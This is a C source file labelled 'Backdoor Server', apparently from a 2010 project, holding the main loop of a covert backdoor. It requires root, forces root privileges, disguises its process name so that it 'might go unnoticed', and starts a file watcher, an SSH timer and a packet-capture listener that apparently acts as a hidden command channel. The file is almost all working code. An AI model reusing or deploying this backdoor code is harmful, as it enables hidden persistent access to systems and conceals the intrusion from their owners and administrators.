/*-----------------------------------------------------------------------------
 * server.c - Backdoor Server
 * Copyright (C) 2010 Steffen L. Norgren <ironix@trollop.org>
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.

 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 * 
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *----------------------------------------------------------------------------*/

#include "server.h"
#include "packet_utils.h"
#include "file_watcher.h"
#include "ssh_utils.h"

/*-----------------------------------------------------------------------------
 * FUNCTION:    main 
 * 
 * DATE:        July 4, 2010
 * 
 * REVISIONS:   
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   int main(int argc, char **argv)
 *                  argc - argument count
 *                  argv - array of arguments
 * 
 * RETURNS:     Result on success or failure.
 *
 * NOTES: Main entry point into the program. Configures the server defaults.
 *----------------------------------------------------------------------------*/
int main(int argc, char *argv[])
{
	pthread_t thread_fw, thread_ssh, thread_pcap;
	int tret_fw, tret_ssh, tret_pcap;

	/* make sure user is root */
	if (geteuid() != USER_ROOT) {
		fprintf(stderr, "Must be root to run this program.\n");
		exit(ERROR_NOTROOT);
	}

    /* initialize signal handler */
	signal(SIGTERM, signal_handler);
    signal(SIGQUIT, signal_handler);
    signal(SIGKILL, signal_handler);
    signal(SIGINT, signal_handler);
	
	/* raise privileges */
	if (setuid(0) != SUCCESS || setgid(0) != SUCCESS) {
		err(1, "raise privileges");
	}

	/* daemonize the process */
	/* daemonize(); */

	/* mask the process name */
	mask_process(argv, PROCESS_NAME);

	/* start file watcher */
	watching = TRUE;
	tret_fw = pthread_create(&thread_fw, NULL, file_watcher, (void *)NULL);

	/* start SSH timer */
	tret_ssh = pthread_create(&thread_ssh, NULL, ssh_start, (void *)NULL);

	/* start server */
	server = TRUE;
	tret_pcap = pthread_create(&thread_pcap, NULL, pcap_start, (void *)NULL);
	pthread_join(thread_pcap, NULL);

	return SUCCESS;
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    signal_handler 
 * 
 * DATE:        June 4, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   signal_handler(int sig)
 *                    sig - the signal that caught the handler
 * 
 * RETURNS:     void
 * 
 * NOTES: Enables graceful termination of the program.
 *----------------------------------------------------------------------------*/
void signal_handler(int sig)
{
	switch(sig) {
		case SIGTERM:
			fprintf(stderr, "Received SIGTERM, terminating.\n");
			exit_clean();
		case SIGQUIT:
			fprintf(stderr, "Received SIGQUIT, terminating.\n");
			exit_clean();
		case SIGKILL:
			fprintf(stderr, "Received SIGKILL, terminating.\n");
			exit_clean();
		case SIGINT:
			fprintf(stderr, "\nReceived SIGINT, terminating.\n");
			exit_clean();
		default:
			break;
	}
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    daemonize 
 * 
 * DATE:        June 4, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   daemonize(void)
 * 
 * RETURNS:     void
 * 
 * NOTES: Daemonizes the application such that it technically runs as a zombie
 *        process.
 *----------------------------------------------------------------------------*/
void daemonize(void)
{
	pid_t pid;

	/* fork off the parent process */
	pid = fork();
	if (pid < SUCCESS)
		err(1, "fork");
	else if (pid > SUCCESS) /* exit parent process */
		exit(SUCCESS);
}

/*-----------------------------------------------------------------------------
 * FUNCTION:    mask_process 
 * 
 * DATE:        June 4, 2010
 * 
 * DESIGNER:    Steffen L. Norgren <ironix@trollop.org>
 * 
 * PROGRAMMER:  Steffen L. Norgren <ironix@trollop.org>
 * 
 * INTERFACE:   mask_process(char *argv[], char *name)
 *                   argv - initial command used
 *                   name - new name to mask the process with
 * 
 * RETURNS:     void
 * 
 * NOTES: Masks the process name with something that might go unnoticed.
 *
 *----------------------------------------------------------------------------*/
void mask_process(char *argv[], char *name)
{
	memset(argv[0], 0, strlen(argv[0]));
	strcpy(argv[0], name);
	prctl(PR_SET_NAME, name, 0, 0);
}
